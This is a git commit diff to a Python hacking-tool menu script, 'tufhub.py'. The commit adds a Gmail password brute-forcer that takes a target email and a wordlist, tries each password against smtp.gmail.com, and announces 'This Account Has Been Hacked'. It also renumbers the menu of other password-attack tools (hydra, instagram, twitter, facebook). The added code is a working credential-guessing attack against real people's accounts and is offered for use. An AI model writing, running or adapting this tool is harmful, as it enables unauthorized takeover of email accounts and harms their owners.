b831795a07f656daa0b5f4acb8f8361c129d031a
un_kn0wn h4c_k3r <40415158+unkn0wnh4ckr@users.noreply.github.com>
2018-11-22 20:18:36 -0500

    Update tufhub.py

--- tufhub.py
+++ tufhub.py
@@ -778,6 +778,81 @@ def webkiller():
           raw_input("[*] Back To Menu (Press Enter...) ")
 
 
+def gmail():
+  #!/usr/bin/python
+  '''create by Ha3MrX'''
+
+  import smtplib
+  from os import system
+
+  def main():
+     print '================================================='
+     print '               create by Ha3MrX                  '
+     print '================================================='
+     print '               ++++++++++++++++++++              '
+     print '\n                                               '
+     print '  _,.                                            '
+     print '                                                 '
+     print '                                                 '
+     print '           HA3MrX                                '
+     print '       _,.                   '
+     print '     ,` -.)                  '
+     print '    ( _/-\\-._               '
+     print '   /,|`--._,-^|            , '
+     print '   \_| |`-._/||          , | '
+     print '     |  `-, / |         /  / '
+     print '     |     || |        /  /  '
+     print '      `r-._||/   __   /  /   '
+     print '  __,-<_     )`-/  `./  /    '
+     print '  \   `---    \   / /  /     '
+     print '     |           |./  /      '
+     print '     /           //  /       '
+     print ' \_/  \         |/  /        '
+     print '  |    |   _,^- /  /         '
+     print '  |    , ``  (\/  /_         '
+     print '   \,.->._    \X-=/^         '
+     print '   (  /   `-._//^`           '
+     print '    `Y-.____(__}             '
+     print '     |     {__)              ' 
+     print '           ()   V.1.0        '
+
+  main()
+  print '[1] start the attack'
+  print '[2] exit'
+  option = input('==>')
+  if option == 1:
+     file_path = raw_input('path of passwords file :')
+  else:
+     system('clear')
+     exit()
+  pass_file = open(file_path,'r')
+  pass_list = pass_file.readlines()
+  def login():
+      i = 0
+      user_name = raw_input('target email :')
+      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+      server.ehlo()
+      for password in pass_list:
+        i = i + 1
+        print str(i) + '/' + str(len(pass_list))
+        try:
+           server.login(user_name, password)
+           system('clear')
+           main()
+           print '\n'
+           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+           break
+        except smtplib.SMTPAuthenticationError as e:
+           error = str(e)
+           if error[14] == '<':
+              system('clear')
+              main()
+              print '[+] this account has been hacked, password :' + password + '     ^_^'
+
+              break
+           else:
+              print '[!] password not found => ' + password
+  login()
 
 def redhawk():
   os.system("php /root/tufhub/redhawk/rhawk.php")
@@ -1145,18 +1220,21 @@ def password():
   print G+"-" * 100
   print r+"[1]  hydra"
   print "[2]  instagram"
-  print "[3]  twitter"
-  print "[4]  facebook"
+  print "[3]  gmail"
+  print "[4]  twitter[broken]"
+  print "[5]  facebook"
   print G+"-" * 100
   password = raw_input("[PASSWD] \033[94m->: \033[0m")
   if password == "1" :
     hydra()
   if password == "2" :
     instagram()
-  if password == "3" :
-    twitter()
   if password == "4" :
+    twitter()
+  if password == "5" :
     facebook()
+  if password == "3" :
+    gmail()
   if password == "menu" :
     os.system("clear")
     mainbanner()
